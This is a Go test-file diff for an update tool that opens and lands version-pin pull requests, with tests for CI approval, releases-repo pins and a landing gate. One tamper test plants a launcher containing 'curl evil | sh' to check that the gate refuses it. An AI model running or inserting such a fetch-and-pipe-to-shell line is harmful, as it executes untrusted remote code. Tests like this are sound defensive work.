@@ -88,6 +88,14 @@ func newWorld(t *testing.T, f settings.Format) *world {
 	gitRun(t, w.repo, "remote", "add", "origin", w.bare)
 	gitRun(t, w.repo, "push", "-q", "origin", "main")
 	w.mainRun(t, "success")
+	w.hub.holdOnOpen = true
+	w.hub.headOf = func(ref string) string {
+		out, err := exec.Command("git", "--git-dir", w.bare, "rev-parse", "--verify", "--quiet", "refs/heads/"+ref).Output()
+		if err != nil {
+			return ""
+		}
+		return strings.TrimSpace(string(out))
+	}
 	return w
 }
 
@@ -110,7 +118,7 @@ func (w *world) mainRun(t *testing.T, state string) {
 func (w *world) deps(t *testing.T) Deps {
 	return Deps{GitHub: w.hub, Registry: w.reg.client(), Git: gitcmd.Repo{Dir: w.repo}, Roots: rootsOf(testRoot),
 		CacheRoot: filepath.Join(t.TempDir(), "claudinite"), Platform: version.Platform(), Now: func() time.Time { return t0 },
-		Repo: w.repo, FullName: "o/r", Out: w.out, Timeout: 10 * time.Second}
+		Sleep: func(time.Duration) {}, Repo: w.repo, FullName: "o/r", Out: w.out, Timeout: 10 * time.Second}
 }
 
 func (w *world) publish(t *testing.T, ver string, o relOpts) {
@@ -229,15 +237,89 @@ func TestProposeOpensAPinOnlyPR(t *testing.T) {
 		if strings.Contains(body, "--force") {
 			t.Errorf("%s: PR body mentions --force", f)
 		}
-		if got := w.hub.called("label"); len(got) != 1 || got[0] != "label 1 claudinite-update" {
-			t.Errorf("%s: labels %v", f, got)
-		}
-		if got := w.hub.called("dispatch"); len(got) != 1 || got[0] != "dispatch claudinite-ci.yml "+branch+" pr=1" {
+		if got := w.hub.called("dispatch"); len(got) != 0 {
 			t.Errorf("%s: dispatches %v", f, got)
+		}
+		if got := w.hub.called("approve"); !reflect.DeepEqual(got, []string{"approve 1"}) {
+			t.Errorf("%s: approvals %v", f, got)
 		}
 		if _, err := os.Stat(filepath.Join(w.deps(t).CacheRoot, v2)); err == nil {
 			t.Errorf("%s: deps() cache reused", f)
 		}
+	}
+}
+
+// onReleasesRepo is body, a settingsFor, with engine.releases naming
+// acme/acme-distro.
+func onReleasesRepo(f settings.Format, body string) string {
+	switch f {
+	case settings.TOML:
+		return strings.Replace(body, "version =", "releases = \"acme/acme-distro\"\nversion =", 1)
+	case settings.JSON:
+		return strings.Replace(body, `"version":`, `"releases": "acme/acme-distro", "version":`, 1)
+	}
+	return strings.Replace(body, "  version:", "  releases: \"acme/acme-distro\"\n  version:", 1)
+}
+
+// A pin on engine.releases takes the version that repository's latest
+// release.json names, fetched from its release and never from npm.
+func TestAReleasesPinProposesTheLatestRelease(t *testing.T) {
+	t.Parallel()
+	for _, f := range settings.Formats {
+		w := newWorld(t, f)
+		onReleases := onReleasesRepo(f, settingsFor(f, v1, pin1))
+		if err := os.WriteFile(filepath.Join(w.repo, settings.RelPath(f)), []byte(onReleases), 0o644); err != nil {
+			t.Fatal(err)
+		}
+		gitRun(t, w.repo, "commit", "-q", "-am", "releases")
+		gitRun(t, w.repo, "push", "-q", "origin", "main")
+		w.mainRun(t, "success")
+		w.publish(t, v2, relOpts{})
+		w.reg.toReleases(t, "acme/acme-distro", pkg, v2)
+		w.publish(t, v3, relOpts{})
+		d := w.deps(t)
+		d.ReleasesHost = w.reg.srv.URL
+		v, err := Engine(d, Options{})
+		if err != nil || v != "opened #1 for "+v2 {
+			t.Fatalf("%s: %q %v\n%s", f, v, err, w.out)
+		}
+		for _, r := range w.reg.requests() {
+			if !strings.HasPrefix(r, "/acme/acme-distro/") {
+				t.Errorf("%s: read %s, not the releases repository", f, r)
+			}
+		}
+		committed := gitRun(t, w.bare, "show", "claudinite/engine-"+v2+":"+settings.RelPath(f)) + "\n"
+		e, err := settings.ReadEngine([]byte(committed), f)
+		if err != nil || e.Version != v2 || e.Releases != "acme/acme-distro" {
+			t.Errorf("%s: committed settings %+v %v", f, e, err)
+		}
+		if err := CheckPin(d, e); err != nil {
+			t.Errorf("%s: the proposed pin does not check: %v", f, err)
+		}
+		e.Manifest = pin1
+		if err := CheckPin(d, e); err == nil {
+			t.Errorf("%s: a pin whose manifest is not the release's checked", f)
+		}
+	}
+}
+
+// A release.json naming the pin, or an older version, proposes nothing.
+func TestAReleasesPinAtTheLatestReleaseIsUpToDate(t *testing.T) {
+	t.Parallel()
+	w := newWorld(t, settings.YAML)
+	w.publish(t, v1, relOpts{})
+	w.reg.toReleases(t, "acme/acme-distro", pkg, v1)
+	onReleases := onReleasesRepo(settings.YAML, settingsFor(settings.YAML, v1, pin1))
+	if err := os.WriteFile(filepath.Join(w.repo, settings.RelPath(settings.YAML)), []byte(onReleases), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	gitRun(t, w.repo, "commit", "-q", "-am", "releases")
+	gitRun(t, w.repo, "push", "-q", "origin", "main")
+	w.mainRun(t, "success")
+	d := w.deps(t)
+	d.ReleasesHost = w.reg.srv.URL
+	if v, err := Engine(d, Options{}); err != nil || v != "up to date" {
+		t.Fatalf("%q %v\n%s", v, err, w.out)
 	}
 }
 
@@ -349,7 +431,7 @@ func (w *world) openUpdatePR(t *testing.T, n int, ver, ciConclusion string) stri
 	sha := w.head(t)
 	gitRun(t, w.repo, "checkout", "-q", "main")
 	gitRun(t, w.repo, "branch", "-q", "-D", branch)
-	w.hub.pulls = append(w.hub.pulls, githubapi.PR{Number: n, Title: "Claudinite engine " + ver, Author: "github-actions[bot]", Labels: []string{"claudinite-update"}, HeadRef: branch, HeadSHA: sha, BaseRef: "main", State: "open"})
+	w.hub.pulls = append(w.hub.pulls, githubapi.PR{Number: n, Title: "Claudinite engine " + ver, Author: "github-actions[bot]", HeadRef: branch, HeadSHA: sha, BaseRef: "main", State: "open"})
 	if w.hub.next <= n {
 		w.hub.next = n + 1
 	}
@@ -383,17 +465,90 @@ func TestLandsAGreenUpdatePRFirst(t *testing.T) {
 	}
 }
 
-// Only the run the updater dispatched counts: a gated pull_request run on
-// the same head is not a verdict.
-func TestAnUpdatePRWithOnlyAGatedRunWaits(t *testing.T) {
+// A run held at action_required is no verdict: the update approves it
+// and waits, dispatching nothing; an approved pull_request run that
+// passed lands the PR.
+func TestAnUpdatePRWithOnlyAHeldRunIsApproved(t *testing.T) {
 	t.Parallel()
 	w := newWorld(t, settings.YAML)
 	w.publish(t, v2, relOpts{})
 	sha := w.openUpdatePR(t, 4, v2, "")
-	w.hub.runs[sha] = []githubapi.Run{{HeadSHA: sha, Event: "pull_request", Status: "completed", Conclusion: "success", CreatedAt: "2026-10-01T00:00:00Z"}}
-	v, err := Engine(w.deps(t), Options{})
-	if err != nil || v != "skipped: #4 for "+v2+" is open and has no CI run; dispatched its CI again" {
-		t.Fatalf("%q %v", v, err)
+	w.hub.runs[sha] = []githubapi.Run{{ID: 77, HeadSHA: sha, Event: "pull_request", Status: "completed", Conclusion: "action_required", CreatedAt: "2026-10-01T00:00:00Z"}}
+	r, err := EngineRun(w.deps(t), Options{})
+	if err != nil || r.Verdict != "skipped: #4 for "+v2+" is open and has no CI run; approved its held run" || !r.PRPending {
+		t.Fatalf("%+v %v", r, err)
+	}
+	if got := w.hub.called("approve"); !reflect.DeepEqual(got, []string{"approve 77"}) || len(w.hub.called("dispatch")) != 0 {
+		t.Errorf("%v", w.hub.calls)
+	}
+
+	w = newWorld(t, settings.YAML)
+	w.publish(t, v2, relOpts{})
+	sha = w.openUpdatePR(t, 4, v2, "")
+	w.hub.runs[sha] = []githubapi.Run{{ID: 78, HeadSHA: sha, Event: "pull_request", Status: "completed", Conclusion: "success", CreatedAt: "2026-10-01T00:00:00Z"}}
+	if v, err := Engine(w.deps(t), Options{}); err != nil || v != "landed "+v2 {
+		t.Fatalf("an approved green pull_request run: %q %v", v, err)
+	}
+}
+
+// With approval the PR's own runs land it in the run that opened it,
+// through Land: no dispatch on its branch, CI dispatched on main after.
+func TestAnUpdatePRLandsInTheRunOnItsApprovedCI(t *testing.T) {
+	t.Parallel()
+	w := newWorld(t, settings.YAML)
+	w.publish(t, v2, relOpts{})
+	w.hub.approved = "success"
+	r, err := EngineRun(w.deps(t), Options{})
+	if err != nil || r.Verdict != "landed "+v2 {
+		t.Fatalf("%+v %v\n%s", r, err, w.out)
+	}
+	if got := w.hub.called("merge"); len(got) != 1 || !strings.HasPrefix(got[0], "merge 1 ") {
+		t.Errorf("merge %v", got)
+	}
+	if got := w.hub.called("dispatch"); !reflect.DeepEqual(got, []string{"dispatch claudinite-ci.yml main pr="}) {
+		t.Errorf("dispatches %v", got)
+	}
+	if !r.MainPending {
+		t.Error("main's new head has no CI verdict yet, but the run does not say so")
+	}
+
+	// Red CI leaves the PR open, settled until a person or a newer
+	// version moves it.
+	w = newWorld(t, settings.YAML)
+	w.publish(t, v2, relOpts{})
+	w.hub.approved = "failure"
+	r, err = EngineRun(w.deps(t), Options{})
+	if err != nil || r.Verdict != "opened #1 for "+v2 || r.PRPending || len(w.hub.called("merge")) != 0 {
+		t.Fatalf("%+v %v", r, err)
+	}
+
+	// CI still running at the bound: the PR stays open and the run says
+	// its verdict is still to come.
+	w = newWorld(t, settings.YAML)
+	w.publish(t, v2, relOpts{})
+	r, err = EngineRun(w.deps(t), Options{})
+	if err != nil || r.Verdict != "opened #1 for "+v2 || !r.PRPending || len(w.hub.called("merge")) != 0 {
+		t.Fatalf("%+v %v", r, err)
+	}
+}
+
+// Where no pull_request run appears on the PR's head within the bound,
+// the update dispatches its CI as before, whose land job lands it, and
+// says which path ran.
+func TestAnUpdatePRWithNoHeldRunDispatchesItsCI(t *testing.T) {
+	t.Parallel()
+	w := newWorld(t, settings.YAML)
+	w.publish(t, v2, relOpts{})
+	w.hub.holdOnOpen = false
+	r, err := EngineRun(w.deps(t), Options{})
+	if err != nil || r.Verdict != "opened #1 for "+v2 || r.PRPending {
+		t.Fatalf("%+v %v", r, err)
+	}
+	if got := w.hub.called("dispatch"); !reflect.DeepEqual(got, []string{"dispatch claudinite-ci.yml claudinite/engine-" + v2 + " pr=1"}) {
+		t.Errorf("dispatches %v", got)
+	}
+	if !strings.Contains(w.out.String(), "pull_request run appeared") {
+		t.Errorf("which path ran is not said:\n%s", w.out)
 	}
 }
 
@@ -454,7 +609,7 @@ func TestLand(t *testing.T) {
 	if v, err := gateAt(t, w.repo, w.deps(t), w.hub.pulls[0]); err != nil || v != "ok: "+sha+" may land "+v2 || len(writes(w.hub.calls[before:])) != 0 {
 		t.Errorf("the gate on a pin-only PR: %q %v, calls %v", v, err, w.hub.calls[before:])
 	}
-	v, err := Land(w.deps(t), 4, sha)
+	v, err := Land(landJob(w.hub, w.deps(t), sha), 4, sha)
 	if err != nil || v != "landed "+v2 {
 		t.Fatalf("%q %v", v, err)
 	}
@@ -466,9 +621,9 @@ func TestLand(t *testing.T) {
 func TestLandRefusesWhatIsNotAPinOnlyUpdatePR(t *testing.T) {
 	t.Parallel()
 	cases := map[string]func(w *world, t *testing.T){
-		"a person's PR": func(w *world, t *testing.T) { w.hub.pulls[0].Author = "someone" },
-		"no label":      func(w *world, t *testing.T) { w.hub.pulls[0].Labels = nil },
-		"another base":  func(w *world, t *testing.T) { w.hub.pulls[0].BaseRef = "dev" },
+		"a person's PR":  func(w *world, t *testing.T) { w.hub.pulls[0].Author = "someone" },
+		"another branch": func(w *world, t *testing.T) { w.hub.pulls[0].HeadRef = "feature" },
+		"another base":   func(w *world, t *testing.T) { w.hub.pulls[0].BaseRef = "dev" },
 		"more than the pin": func(w *world, t *testing.T) {
 			gitRun(t, w.repo, "fetch", "-q", "origin", w.hub.pulls[0].HeadRef)
 			gitRun(t, w.repo, "checkout", "-q", "FETCH_HEAD")
@@ -505,23 +660,6 @@ func TestLandRefusesWhatIsNotAPinOnlyUpdatePR(t *testing.T) {
 	}
 }
 
-// A plan correction PR an earlier engine opened has nothing left to land:
-// the refusal tells the person to close it.
-func TestLandTellsAPersonToCloseARetiredPlanPR(t *testing.T) {
-	t.Parallel()
-	w := newWorld(t, settings.YAML)
-	w.publish(t, v2, relOpts{})
-	w.openUpdatePR(t, 4, v2, "")
-	w.hub.pulls[0].HeadRef = "claudinite/plan-2026-10-01"
-	_, err := Land(w.deps(t), 4, w.hub.pulls[0].HeadSHA)
-	if err == nil || !strings.Contains(err.Error(), "close #4") || !strings.Contains(err.Error(), "claudinite/plan-2026-10-01") {
-		t.Errorf("err %v", err)
-	}
-	if len(w.hub.called("merge")) != 0 {
-		t.Error("merged")
-	}
-}
-
 // The verdict is the last stdout line and takes one of these forms; T9's
 // live steps and the workflow's summary read it.
 func TestVerdictForms(t *testing.T) {
@@ -549,7 +687,7 @@ func TestARevokedPinFilesOneIssue(t *testing.T) {
 	if v, err := Engine(w.deps(t), Options{}); err != nil || v != "opened #1 for "+v2 {
 		t.Fatalf("%q %v\n%s", v, err, w.out)
 	}
-	if got := w.hub.called("create-issue"); len(got) != 1 || got[0] != "create-issue Claudinite engine "+v1+" is revoked|claudinite-update" {
+	if got := w.hub.called("create-issue"); len(got) != 1 || got[0] != "create-issue Claudinite engine "+v1+" is revoked" {
 		t.Fatalf("issues %v", got)
 	}
 	body := w.hub.issues[0].Body
@@ -652,18 +790,14 @@ func TestAnUpdatePRWhoseCIDidNotRunIsDispatchedAgain(t *testing.T) {
 	}
 }
 
-func TestAnUnlabelledUpdatePRIsRelabelledNotDuplicated(t *testing.T) {
+func TestAnUpdatePRIsKnownByItsBranchAndAuthor(t *testing.T) {
 	t.Parallel()
 	w := newWorld(t, settings.YAML)
 	w.publish(t, v2, relOpts{})
 	w.openUpdatePR(t, 4, v2, "failure")
-	w.hub.pulls[0].Labels = nil
 	v, err := Engine(w.deps(t), Options{})
 	if err != nil || v != "skipped: #4 for "+v2+" is open and its CI concluded failure" {
 		t.Fatalf("%q %v", v, err)
-	}
-	if got := w.hub.called("label"); len(got) != 1 || got[0] != "label 4 claudinite-update" {
-		t.Errorf("labels %v", got)
 	}
 	if len(w.hub.called("create-pull")) != 0 {
 		t.Error("opened a second PR")
@@ -672,9 +806,9 @@ func TestAnUnlabelledUpdatePRIsRelabelledNotDuplicated(t *testing.T) {
 	w = newWorld(t, settings.YAML)
 	w.publish(t, v2, relOpts{})
 	w.openUpdatePR(t, 4, v2, "failure")
-	w.hub.pulls[0].Labels, w.hub.pulls[0].Author = nil, "someone"
-	if _, err := Engine(w.deps(t), Options{}); err != nil || len(w.hub.called("label 4")) != 0 {
-		t.Errorf("relabelled a person's PR: %v %v", err, w.hub.calls)
+	w.hub.pulls[0].Author = "someone"
+	if v, err := Engine(w.deps(t), Options{}); err != nil || strings.Contains(v, "#4") {
+		t.Errorf("took a person's PR for an update PR: %q %v", v, err)
 	}
 }
 
@@ -735,7 +869,7 @@ func TestLandAnUpdatePRRestatingTheMemberFile(t *testing.T) {
 	}
 	w, sha := propose(t)
 	w.hub.pulls[0].HeadSHA = sha
-	if v, err := Land(w.deps(t), 1, sha); err != nil || v != "landed "+v2 {
+	if v, err := Land(landJob(w.hub, w.deps(t), sha), 1, sha); err != nil || v != "landed "+v2 {
 		t.Fatalf("%q %v\n%s", v, err, w.out)
 	}
 
@@ -778,7 +912,7 @@ func TestLandAnUpdatePRRestatingTheMemberFile(t *testing.T) {
 	}
 	sha = gitRun(t, w.bare, "rev-parse", branch)
 	w.hub.pulls[0].HeadSHA = sha
-	if v, err := Land(w.deps(t), 1, sha); err != nil || v != "landed "+v2 {
+	if v, err := Land(landJob(w.hub, w.deps(t), sha), 1, sha); err != nil || v != "landed "+v2 {
 		t.Errorf("a legacy member's engine PR: %q %v\n%s", v, err, w.out)
 	}
 
@@ -814,51 +948,6 @@ func declareHello(t *testing.T, w *world) {
 	gitRun(t, w.repo, "commit", "-q", "-m", "declare hello")
 	gitRun(t, w.repo, "push", "-q", "origin", "main")
 	w.mainRun(t, "success")
-}
-
-func withLicense(f settings.Format, ver, pin string) string {
-	switch f {
-	case settings.TOML:
-		return settingsFor(f, ver, pin) + "\n[license]\nplan = \"public\"\n"
-	case settings.JSON:
-		return strings.Replace(settingsFor(f, ver, pin), "\"other\": 1", "\"license\": {\"plan\": \"public\"},\n  \"other\": 1", 1)
-	}
-	return settingsFor(f, ver, pin) + "license:\n  plan: \"public\"\n"
-}
-
-func TestTheUpdatePRDropsTheRetiredLicenseBlock(t *testing.T) {
-	t.Parallel()
-	for _, f := range settings.Formats {
-		w := newWorld(t, f)
-		if err := os.WriteFile(filepath.Join(w.repo, settings.RelPath(f)), []byte(withLicense(f, v1, pin1)), 0o644); err != nil {
-			t.Fatal(err)
-		}
-		gitRun(t, w.repo, "commit", "-q", "-am", "licensed")
-		gitRun(t, w.repo, "push", "-q", "origin", "main")
-		w.mainRun(t, "success")
-		w.publish(t, v2, relOpts{})
-		v, err := Engine(w.deps(t), Options{})
-		if err != nil || v != "opened #1 for "+v2 {
-			t.Fatalf("%s: %q %v\n%s", f, v, err, w.out)
-		}
-		branch := "claudinite/engine-" + v2
-		committed := gitRun(t, w.bare, "show", branch+":"+settings.RelPath(f)) + "\n"
-		e, err := settings.ReadEngine([]byte(committed), f)
-		if err != nil || e.Version != v2 {
-			t.Fatalf("%s: committed settings %+v %v", f, e, err)
-		}
-		if settings.HasRetiredLicense([]byte(committed), f) {
-			t.Errorf("%s: the license block survived:\n%s", f, committed)
-		}
-		want, _ := settings.SetPin([]byte(settingsFor(f, v1, pin1)), f, v2, e.Manifest)
-		if committed != string(want) {
-			t.Errorf("%s: dropped more than the block:\n%s\nwant\n%s", f, committed, want)
-		}
-		creates := w.hub.called("create-pull")
-		if len(creates) != 1 || !strings.Contains(creates[0], "retired `license` block") {
-			t.Errorf("%s: PR body does not name the dropped block: %v", f, creates)
-		}
-	}
 }
 
 // A pin on the retired canary package takes the canary tag of the one
@@ -908,7 +997,13 @@ func TestProposeWaitsForNpmToServeTheTarballs(t *testing.T) {
 	if err != nil || v != "opened #1 for "+v2 {
 		t.Fatalf("%q %v\n%s", v, err, w.out)
 	}
-	if len(slept) != 3 || slept[0] != 20*time.Second {
+	var served []time.Duration
+	for _, s := range slept {
+		if s == servedEvery {
+			served = append(served, s)
+		}
+	}
+	if len(served) != 3 {
 		t.Errorf("slept %v, want three 20s waits", slept)
 	}
 	if !strings.Contains(w.out.String(), "npm lists "+v2+" but does not serve") {
@@ -931,5 +1026,86 @@ func TestProposeWaitsForNpmToServeTheTarballs(t *testing.T) {
 	}
 	if total != npmreg.ServeWait {
 		t.Errorf("waited %v in all, want npmreg.ServeWait (%v)", total, npmreg.ServeWait)
+	}
+}
+
+// The update PR carries the launcher the new engine ships, so a member
+// takes a launcher change with the pin, and the landing gate accepts that
+// launcher and no other.
+func TestAnUpdatePRCarriesTheShippedLauncher(t *testing.T) {
+	t.Parallel()
+	branch := "claudinite/engine-" + v2
+	propose := func(t *testing.T, o relOpts) (*world, string) {
+		w := newWorld(t, settings.YAML)
+		p := filepath.Join(w.repo, filepath.FromSlash(LauncherPath))
+		_ = os.WriteFile(p, []byte("#!/bin/sh\n# launcher of "+v1+"\n"), 0o755)
+		gitRun(t, w.repo, "add", "-A")
+		gitRun(t, w.repo, "commit", "-q", "-m", "the launcher "+v1+" shipped")
+		gitRun(t, w.repo, "push", "-q", "origin", "main")
+		w.mainRun(t, "success")
+		w.publish(t, v2, o)
+		if v, err := Engine(w.deps(t), Options{}); err != nil || v != "opened #1 for "+v2 {
+			t.Fatalf("%q %v\n%s", v, err, w.out)
+		}
+		return w, gitRun(t, w.bare, "rev-parse", branch)
+	}
+
+	w, sha := propose(t, relOpts{})
+	if got := gitRun(t, w.bare, "diff", "--name-only", "main", branch); got != LauncherPath+"\n"+settings.RelPath(settings.YAML) {
+		t.Errorf("branch changes %q", got)
+	}
+	if got := gitRun(t, w.bare, "show", branch+":"+LauncherPath); got != "#!/bin/sh\n# launcher of "+v2 {
+		t.Errorf("the PR's launcher reads %q", got)
+	}
+	w.hub.pulls[0].HeadSHA = sha
+	for i := range w.hub.runs[sha] {
+		w.hub.runs[sha][i].Status, w.hub.runs[sha][i].Conclusion = "completed", "success"
+	}
+	if v, err := Land(w.deps(t), 1, sha); err != nil || v != "landed "+v2 {
+		t.Fatalf("%q %v\n%s", v, err, w.out)
+	}
+
+	// A repo holding no launcher gets none from the update, and the gate
+	// refuses a PR that adds one, even the one the release ships.
+	w = newWorld(t, settings.YAML)
+	w.publish(t, v2, relOpts{})
+	if v, err := Engine(w.deps(t), Options{}); err != nil || v != "opened #1 for "+v2 {
+		t.Fatalf("%q %v\n%s", v, err, w.out)
+	}
+	if got := gitRun(t, w.bare, "diff", "--name-only", "main", branch); got != settings.RelPath(settings.YAML) {
+		t.Errorf("a repo with no launcher: branch changes %q", got)
+	}
+	gitRun(t, w.repo, "fetch", "-q", "origin", branch)
+	gitRun(t, w.repo, "checkout", "-q", "FETCH_HEAD")
+	_ = os.WriteFile(filepath.Join(w.repo, filepath.FromSlash(LauncherPath)), []byte("#!/bin/sh\n# launcher of "+v2+"\n"), 0o755)
+	gitRun(t, w.repo, "add", "-A")
+	gitRun(t, w.repo, "commit", "-q", "-m", "add the launcher")
+	gitRun(t, w.repo, "push", "-q", "-f", "origin", "HEAD:refs/heads/"+branch)
+	w.hub.pulls[0].HeadSHA = w.head(t)
+	gitRun(t, w.repo, "checkout", "-q", "main")
+	if _, err := Land(w.deps(t), 1, w.hub.pulls[0].HeadSHA); err == nil || !strings.Contains(err.Error(), "only cn init writes") {
+		t.Errorf("an added launcher landed: %v", err)
+	}
+
+	// A release whose signed manifest hashes no launcher leaves the
+	// member's alone.
+	w, _ = propose(t, relOpts{unhashedLauncher: true})
+	if got := gitRun(t, w.bare, "diff", "--name-only", "main", branch); got != settings.RelPath(settings.YAML) {
+		t.Errorf("an unhashed launcher's release changes %q", got)
+	}
+
+	w, _ = propose(t, relOpts{})
+	gitRun(t, w.repo, "fetch", "-q", "origin", branch)
+	gitRun(t, w.repo, "checkout", "-q", "FETCH_HEAD")
+	_ = os.WriteFile(filepath.Join(w.repo, filepath.FromSlash(LauncherPath)), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755)
+	gitRun(t, w.repo, "commit", "-q", "-am", "tamper")
+	gitRun(t, w.repo, "push", "-q", "-f", "origin", "HEAD:refs/heads/"+branch)
+	w.hub.pulls[0].HeadSHA = w.head(t)
+	gitRun(t, w.repo, "checkout", "-q", "main")
+	if _, err := Land(w.deps(t), 1, w.hub.pulls[0].HeadSHA); err == nil || !strings.Contains(err.Error(), "not the launcher") {
+		t.Errorf("a launcher the release did not ship landed: %v", err)
+	}
+	if len(w.hub.called("merge")) != 0 {
+		t.Error("merged")
 	}
 }
